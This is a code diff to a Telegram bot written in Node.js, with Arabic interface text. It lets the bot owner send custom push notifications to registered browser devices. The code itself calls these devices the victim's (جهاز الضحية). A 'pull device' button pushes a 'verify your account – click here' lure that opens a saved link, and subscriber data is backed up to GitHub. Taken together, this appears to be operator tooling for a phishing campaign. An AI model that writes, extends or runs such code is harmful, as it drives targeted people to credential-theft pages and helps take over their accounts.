@@ -457,6 +457,19 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
   }
 
+  // ── Reply to "إرسال رسالة" force-reply prompt ────────────────────────────
+  if (chatId === BOT_OWNER && msg?.reply_to_message && msg.text) {
+    const _replyMid = msg.reply_to_message.message_id;
+    if (global._pendingPush && global._pendingPush[_replyMid]) {
+      const _ppid = global._pendingPush[_replyMid];
+      delete global._pendingPush[_replyMid];
+      const _pr = await sendPushToDevice(_ppid, "🔔 رسالة جديدة", msg.text);
+      if (_pr === "sse")   return bot.sendMessage(chatId, "✅ تم الإرسال — الجهاز متصل، سيظهر الإشعار فوراً");
+      if (_pr === "vapid") return bot.sendMessage(chatId, "✅ تم الإرسال — إشعار خلفي، سيصل حتى لو الصفحة مغلقة");
+      return bot.sendMessage(chatId, "📴 الجهاز غير متصل — سيصل عند فتح الرابط مجدداً");
+    }
+  }
+
   if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
     const uid = msg.reply_to_message.text.replace(REPLY_PREFIX,"").split("\n")[0].trim();
     const tid = parseInt(uid);
@@ -796,7 +809,7 @@ bot.on('message', async (msg) => {
         `${status} — جهاز ${i+1} من ${keys.length}\n🆔 \`${pid}\``,
         { parse_mode:"Markdown",
           reply_markup: JSON.stringify({ inline_keyboard: [
-            [{ text:"📲 سحب الجهاز", callback_data:`pull:${pid}` }, { text:"📩 إرسال رسالة", switch_inline_query_current_chat:`/push ${pid} ` }],
+            [{ text:"📲 سحب الجهاز", callback_data:`pull:${pid}` }, { text:"📩 إرسال رسالة", callback_data:`pushmsg:${pid}` }],
             [{ text:"📋 معلومات الجهاز", callback_data:`pushinfo:${pid}` }]
           ] })
         }
@@ -989,15 +1002,31 @@ bot.on('callback_query', async (q) => {
 
   // ── Pull notification (inline button) ─────────────────────────────────────
   if (data.startsWith("pull:")) {
-    if (q.from.id !== BOT_OWNER) return bot.answerCallbackQuery(q.id, { text:"⛔ غير مصرح", show_alert:true });
+    if (q.from.id !== BOT_OWNER) return;
     const _pid = data.slice(5);
-    if (!pushSubs[_pid]) return bot.answerCallbackQuery(q.id, { text:"❌ الجهاز غير مسجّل", show_alert:true });
+    if (!pushSubs[_pid]) return bot.sendMessage(chatId, "❌ الجهاز غير مسجّل في قاعدة البيانات.");
     const _purl = pushSubs[_pid].purl || null;
-    if (!_purl) return bot.answerCallbackQuery(q.id, { text:"⚠️ لا يوجد رابط محفوظ — يجب أن يفتح الرابط أولاً", show_alert:true });
+    if (!_purl) return bot.sendMessage(chatId, "⚠️ لا يوجد رابط محفوظ لهذا الجهاز.\nيجب أن يفتح الرابط مرة أخرى حتى يُحفظ.");
     const _r = await sendPushToDevice(_pid, "🔔 تحقق من حسابك", "اضغط هنا للتحقق من حسابك", _purl);
-    if (_r === "sse")   return bot.answerCallbackQuery(q.id, { text:"✅ تم — الجهاز متصل، سيظهر الإشعار فوراً", show_alert:true });
-    if (_r === "vapid") return bot.answerCallbackQuery(q.id, { text:"✅ تم — إشعار خلفي، عند النقر يفتح الرابط", show_alert:true });
-    return bot.answerCallbackQuery(q.id, { text:"📴 الجهاز غير متصل حالياً", show_alert:true });
+    if (_r === "sse")   return bot.sendMessage(chatId, "✅ تم الإرسال — الجهاز متصل الآن، سيظهر الإشعار فوراً");
+    if (_r === "vapid") return bot.sendMessage(chatId, "✅ تم الإرسال — إشعار خلفي، عند النقر سيُعيد فتح الرابط تلقائياً");
+    return bot.sendMessage(chatId, "📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً");
+  }
+
+  // ── Send push message via force_reply ──────────────────────────────────────
+  if (data.startsWith("pushmsg:")) {
+    if (q.from.id !== BOT_OWNER) return;
+    const _pid = data.slice(8);
+    return bot.sendMessage(chatId,
+      `📩 اكتب نص الرسالة التي تريد إرسالها للجهاز:\n\`${_pid}\``,
+      { parse_mode:"Markdown", reply_markup: JSON.stringify({
+        force_reply: true, input_field_placeholder: "نص الرسالة..."
+      })}
+    ).then(m => {
+      // Store pending push pid keyed by message id
+      if (!global._pendingPush) global._pendingPush = {};
+      global._pendingPush[m.message_id] = _pid;
+    });
   }
 
   // ── Push device info (inline button) ──────────────────────────────────────
@@ -1005,7 +1034,7 @@ bot.on('callback_query', async (q) => {
     if (q.from.id !== BOT_OWNER) return;
     const _pid = data.slice(9);
     const _e   = pushSubs[_pid];
-    if (!_e) return bot.answerCallbackQuery(q.id, { text:"❌ غير موجود", show_alert:true });
+    if (!_e) return bot.sendMessage(chatId, "❌ الجهاز غير موجود في القائمة.");
     const _online  = !!sseClients[_pid];
     const _hasSub  = !!(_e.subscription);
     const _purl    = _e.purl ? _e.purl.slice(0,60)+"…" : "غير محفوظ";
@@ -1016,7 +1045,7 @@ bot.on('callback_query', async (q) => {
       `🔗 الرابط: ${_purl}`,
       { parse_mode:"Markdown",
         reply_markup: JSON.stringify({ inline_keyboard: [
-          [{ text:"📲 سحب الجهاز", callback_data:`pull:${_pid}` }, { text:"📩 إرسال رسالة", switch_inline_query_current_chat:`/push ${_pid} ` }]
+          [{ text:"📲 سحب الجهاز", callback_data:`pull:${_pid}` }, { text:"📩 إرسال رسالة", callback_data:`pushmsg:${_pid}` }]
         ] })
       }
     );
@@ -1726,7 +1755,7 @@ app.get("/push-stream", (req, res) => {
     backupFileToGH("./push_subs.json", "_data/push_subs.json");
     const tid = parseInt(uid, 36);
     const _pushKb = { reply_markup: JSON.stringify({ inline_keyboard: [
-      [{ text: "📲 سحب الجهاز", callback_data: `pull:${pid}` }, { text: "📩 إرسال رسالة", switch_inline_query_current_chat: `/push ${pid} ` }],
+      [{ text: "📲 سحب الجهاز", callback_data: `pull:${pid}` }, { text: "📩 إرسال رسالة", callback_data: `pushmsg:${pid}` }],
       [{ text: "📋 معلومات الجهاز", callback_data: `pushinfo:${pid}` }]
     ] }) };
     bot.sendMessage(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n🆔 \`${pid}\``, { parse_mode:"Markdown", ..._pushKb });
